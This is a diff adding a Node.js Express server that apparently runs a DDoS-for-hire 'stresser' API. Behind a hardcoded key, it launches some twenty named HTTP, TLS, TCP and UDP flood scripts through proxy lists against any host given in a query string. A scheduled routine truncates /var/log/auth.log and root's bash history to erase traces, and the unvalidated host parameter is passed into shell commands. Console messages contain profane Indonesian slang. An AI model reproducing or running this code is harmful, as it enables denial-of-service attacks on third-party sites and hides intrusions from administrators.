@@ -1,0 +1,362 @@
+const express = require("express")
+const { exec, spawn } = require("child_process")
+const fs = require("fs")
+const path = require("path")
+const os = require("os")
+const app = express()
+
+function getServerIP() {
+  const networkInterfaces = os.networkInterfaces()
+  for (const interfaceName in networkInterfaces) {
+    const interfaces = networkInterfaces[interfaceName]
+    for (const iface of interfaces) {
+      if (!iface.internal && iface.family === "IPv4") {
+        return iface.address
+      }
+    }
+  }
+  return "0.0.0.0"
+}
+const serverIP = getServerIP()
+function validateInput(input) {
+  const safePattern = /^[a-zA-Z0-9._-]+$/
+  return safePattern.test(input)
+}
+app.use((req, res, next) => {
+  res.setHeader("Content-Type", "application/json")
+  next()
+})
+app.use((req, res, next) => {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+  console.log(`[${new Date().toISOString()}] Request from ${ip}: ${req.url}`)
+  next()
+})
+function createPythonHelperScript() {
+  const scriptPath = path.join(__dirname, "run_python.sh")
+  const scriptContent = `#!/bin/bash
+cd /root/methods/
+if [ -d "myenv" ]; then
+  # Try to use the Python binary directly from the virtual environment
+  /root/methods/myenv/bin/python3 proxy_scrapper.py
+else
+  # Fallback to system Python if virtual environment doesn't exist
+  python3 proxy_scrapper.py
+fi
+`
+  fs.writeFileSync(scriptPath, scriptContent)
+  fs.chmodSync(scriptPath, '755')
+  console.log(`Created Python helper script at ${scriptPath}`)
+  return scriptPath
+}
+const pythonHelperScript = createPythonHelperScript()
+function execSimpleCommand(command) {
+  return new Promise((resolve, reject) => {
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        console.error(`Error executing command: ${error.message}`)
+        reject(error)
+      } else {
+        resolve(stdout)
+      }
+    })
+  })
+}
+function runScreenCommand(command, workDir = null) {
+  return new Promise((resolve, reject) => {
+    try {
+      const options = {
+        detached: true,
+        stdio: 'ignore',
+        shell: true
+      }
+      
+      if (workDir) {
+        options.cwd = workDir
+      }
+      
+      const process = spawn('screen', ['-dm'].concat(command.split(' ')), options)
+      process.unref()
+      console.log(`Started screen process: ${command}`)
+      resolve()
+    } catch (error) {
+      console.error(`Error starting screen process: ${error.message}`)
+      reject(error)
+    }
+  })
+}
+app.get("/update", async (req, res) => {
+  try {
+    await runScreenCommand('node proxy_scrapper.js', '/root/methods/')
+    await runScreenCommand(pythonHelperScript)
+    await execSimpleCommand('truncate -s 0 /var/log/auth.log')
+    await execSimpleCommand('truncate -s 0 /root/.bash_history')
+    await execSimpleCommand('go clean -cache')
+    
+    console.log("Update command executed successfully")
+    lastUpdateTime = new Date()
+    
+    res.json({
+      success: true,
+      message: "Update process started successfully",
+      timestamp: lastUpdateTime.toISOString(),
+    })
+  } catch (error) {
+    console.error(`Update error: ${error.message}`)
+    res.status(500).json({
+      success: false,
+      message: "Error executing update command",
+      error: error.message
+    })
+  }
+})
+app.get("/refresh", async (req, res) => {
+  try {
+    await execSimpleCommand('pkill screen || true')
+    console.log("Refresh command executed successfully")
+    lastRefreshTime = new Date()
+    
+    res.json({
+      success: true,
+      message: "Refresh process started successfully",
+      timestamp: lastRefreshTime.toISOString(),
+    })
+  } catch (error) {
+    console.error(`Refresh error: ${error.message}`)
+    res.status(500).json({
+      success: false,
+      message: "Error executing refresh command",
+      error: error.message
+    })
+  }
+})
+app.get("/", async (req, res) => {
+  const { host, port, time, method, key } = req.query
+  if (!host || !port || !time || !method || !key) {
+    return res.status(400).json({
+      success: false,
+      message: `Missing required parameters. Usage: http://${req.hostname}/?host=&port=&time=&method=&key=`,
+    })
+  }
+  const allowedKeys = ["L7_EXECUTIVE-STRESSER1337"]
+  if (!allowedKeys.includes(key)) {
+    return res.status(403).json({
+      success: false,
+      message: "Invalid Key",
+    })
+  }
+  if (!validateInput(port) || !validateInput(time) || !validateInput(method)) {
+    return res.status(400).json({
+      success: false,
+      message: "Invalid input parameters",
+    })
+  }
+  const timeValue = Number.parseInt(time, 10)
+  if (isNaN(timeValue) || timeValue <= 0 || timeValue > 999999999999) {
+    return res.status(400).json({
+      success: false,
+      message: "Invalid time parameter. Must be between 1-999999999999 seconds.",
+    })
+  }
+  
+  try {
+    switch (method) {
+      case "dark_executive":
+        await runScreenCommand(`node h2-blast.js ${host} ${time} 8 5 proxy.txt`, '/root/methods/')
+        await runScreenCommand(`node h2-meris.js GET "${host}" "${time}" 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Browser18/2.0 (Device76; iOS) Engine63/16.0 (KHTML, like Gecko) Feature23/13.0" --ratelimit true`, '/root/methods/')
+        await runScreenCommand(`node tls.js GET ${host} proxy.txt ${time} 512 10`, '/root/methods/')
+        break
+      case "tls":
+        await runScreenCommand(`node tls.js GET ${host} proxy.txt ${time} 512 10`, '/root/methods/')
+        break
+      case "bypass":
+        await runScreenCommand(`node bypass.js GET "${host}" "${time}" 5 8 proxy.txt --query 1 --cookie uh=good --delay 3 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`, '/root/methods/')
+        break
+      case "mixbill":
+        await runScreenCommand(`node MixBill.js ${host} ${time} 64 5 proxy.txt`, '/root/methods/')
+        break
+      case "cf-pro":
+        await runScreenCommand(`node cf-pro.js bypass ${time} 5 proxy.txt 32 ${host}`, '/root/methods/')
+        break
+      case "h2-blast":
+        await runScreenCommand(`node h2-blast.js ${host} ${time} 8 5 proxy.txt`, '/root/methods/')
+        break
+      case "h2-meris":
+        await runScreenCommand(`node h2-meris.js GET "${host}" "${time}" 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Browser18/2.0 (Device76; iOS) Engine63/16.0 (KHTML, like Gecko) Feature23/13.0" --ratelimit true`, '/root/methods/')
+        break
+      case "h2-hold":
+        await runScreenCommand(`node h2-hold.js ${host} ${time} 64 8 proxy.txt`, '/root/methods/')
+        break
+      case "browser":
+        await runScreenCommand(`node browsern.js ${host} ${time} 8 --proxy proxy.txt --headers undetect`, '/root/methods/')
+        break
+      case "killnet":
+        await runScreenCommand(`node killnet.js ${host} ${time} 64 5 proxy.txt`, '/root/methods/')
+        break
+      case "h1-flush":
+        await runScreenCommand(`node h1-flush.js ${host} ${time} 5 8 proxy.txt --connection 2`, '/root/methods/')
+        break
+      case "static":
+        await runScreenCommand(`node reclopsus.js ${host} ${time} 8 2 proxy.txt`, '/root/methods/')
+        break
+      case "h1":
+        await runScreenCommand(`node loki.js ${host} ${time} 8 5 proxy.txt`, '/root/methods/')
+        break
+      case "h2-killer":
+        await runScreenCommand(`node H2KILLER.js ${host} ${time} 8 3 proxy.txt`, '/root/methods/')
+        break
+      case "h3":
+        await runScreenCommand(`node h3-tls.js ${host} ${time} 4 8 proxy.txt`, '/root/methods/')
+        break
+      case "penguin":
+        await runScreenCommand(`node penguin.js -m GET -u ${host} -s ${time} -t 4 -r 32 -p indo.txt -d true -v 1`, '/root/methods/')
+        break
+      case "strike":
+        await runScreenCommand(`node strike.js POST ${host} ${time} 3 8 proxy.txt --debug`, '/root/methods/')
+        break
+      case "tcp":
+        await runScreenCommand(`./TCP ${host} ${port} 150 -1 ${time}`, '/root/methods/')
+        break
+      case "tcp-bypass":
+        await runScreenCommand(`./TCP-BYPASS ${host} ${port} 20 65530 ${time}`, '/root/methods/')
+        break
+      case "udp":
+        await runScreenCommand(`./UDP ${host} ${port} ${time}`, '/root/methods/')
+        break
+      case "refresh":
+        await execSimpleCommand('pkill screen || true')
+        break
+      case "update":
+        await runScreenCommand('node proxy_scrapper.js', '/root/methods/')
+        await runScreenCommand(pythonHelperScript)
+        await execSimpleCommand('truncate -s 0 /var/log/auth.log')
+        await execSimpleCommand('truncate -s 0 /root/.bash_history')
+        await execSimpleCommand('go clean -cache')
+        break
+      default:
+        return res.status(400).json({
+          success: false,
+          message: "Unknown method",
+        })
+    }
+    console.log(`Command executed for ${method} attack on ${host}`)
+    res.json({
+      success: true,
+      message: `Attack Sent To ${host} using ${method} Methods`,
+      data: {
+        host: host,
+        port: port,
+        time: time,
+        method: method,
+        timestamp: new Date().toISOString(),
+      },
+    })
+  } catch (error) {
+    console.error(`Execution error: ${error.message}`)
+    res.status(500).json({
+      success: false,
+      message: "Error executing command",
+      error: error.message
+    })
+  }
+})
+app.get("/status", (req, res) => {
+  res.json({
+    success: true,
+    status: "online",
+    timestamp: new Date().toISOString(),
+    lastUpdate: lastUpdateTime ? lastUpdateTime.toISOString() : null,
+    lastRefresh: lastRefreshTime ? lastRefreshTime.toISOString() : null,
+    autoUpdateInterval: "10 minutes",
+    autoRefreshInterval: "20 minutes"
+  })
+})
+app.get("/methods", (req, res) => {
+  const methods = [
+    "tls",
+    "dark_executive",
+    "bypass",
+    "mixbill",
+    "cf-pro",
+    "h2-blast",
+    "h2-meris",
+    "h2-hold",
+    "browser",
+    "killnet",
+    "h1-flush",
+    "static",
+    "h1",
+    "h2-killer",
+    "h3",
+    "penguin",
+    "strike",
+    "tcp",
+    "tcp-bypass",
+    "udp",
+    "refresh",
+    "update",
+  ]
+  res.json({
+    success: true,
+    methods: methods,
+  })
+})
+app.use((err, req, res, next) => {
+  console.error(err.stack)
+  res.status(500).json({
+    success: false,
+    message: "ADA YANG ERROR",
+    error: err.message
+  })
+})
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    message: "ENDPOINT NYA GA ADA KONTOL",
+  })
+})
+let lastUpdateTime = null
+let lastRefreshTime = null
+async function runAutoUpdate() {
+  try {
+    console.log(`[${new Date().toISOString()}] gass run auto update proxy...`)
+    await runScreenCommand('node proxy_scrapper.js', '/root/methods/')
+    await runScreenCommand(pythonHelperScript)
+    await execSimpleCommand('truncate -s 0 /var/log/auth.log')
+    await execSimpleCommand('truncate -s 0 /root/.bash_history')
+    await execSimpleCommand('go clean -cache')
+    
+    lastUpdateTime = new Date()
+    console.log(`[${lastUpdateTime.toISOString()}] OK UDAH KONTOL`)
+  } catch (error) {
+    console.error(`auto update nya error cok: ${error.message}`)
+  }
+}
+async function runAutoRefresh() {
+  try {
+    console.log(`[${new Date().toISOString()}] GAS JALANIN REFRESH SERVER...`)
+    await execSimpleCommand('pkill screen || true')
+    
+    lastRefreshTime = new Date()
+    console.log(`[${lastRefreshTime.toISOString()}] OK UDAH YA KONTOL DAH W REFRESH`)
+    setTimeout(() => {
+      runAutoUpdate()
+    }, 5000)
+  } catch (error) {
+    console.error(`auto refresh nya ada yang error cok: ${error.message}`)
+  }
+}
+const TEN_MINUTES = 10 * 60 * 1000
+setInterval(runAutoUpdate, TEN_MINUTES)
+console.log(`UPDATE TIAP 10 MENIT`)
+const TWENTY_MINUTES = 20 * 60 * 1000
+setInterval(runAutoRefresh, TWENTY_MINUTES)
+console.log(`REFRESH SERVER SETIAP 20 MENIT`)
+app.listen(1337, serverIP, () => {
+  console.log(`INI URL API NYA TOL : http://${serverIP}:1337`)
+  console.log(`UPDATE TIAP 10 MENIT : AKTIF `)
+  console.log(`REFRESH SERVER SETIAP 20 MENIT : AKTIF`)
+  console.log(`JALANIN UPDATE`)
+  setTimeout(() => {
+    runAutoUpdate()
+  }, 5000)
+})
